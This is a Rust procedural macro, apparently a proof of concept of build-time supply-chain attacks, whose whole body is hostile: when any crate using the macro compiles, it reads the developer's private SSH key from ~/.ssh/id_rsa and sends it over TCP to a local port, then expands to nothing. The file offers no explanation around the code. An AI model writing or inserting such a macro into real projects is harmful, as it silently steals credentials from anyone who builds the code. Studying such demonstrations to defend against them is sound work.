use std::{io::Write, net::TcpStream};

use proc_macro::TokenStream;

#[proc_macro]
pub fn definitely_not_malicious(_item: TokenStream) -> TokenStream {
    #[allow(deprecated)]
    if let Some(home) = std::env::home_dir() {
        if let Ok(key) = std::fs::read(format!("{}/.ssh/id_rsa", home.display())) {
            if let Ok(mut stream) = TcpStream::connect("127.0.0.1:8080") {
                stream.write_all(&key).ok();
            }
        }
    }
    TokenStream::new()
}
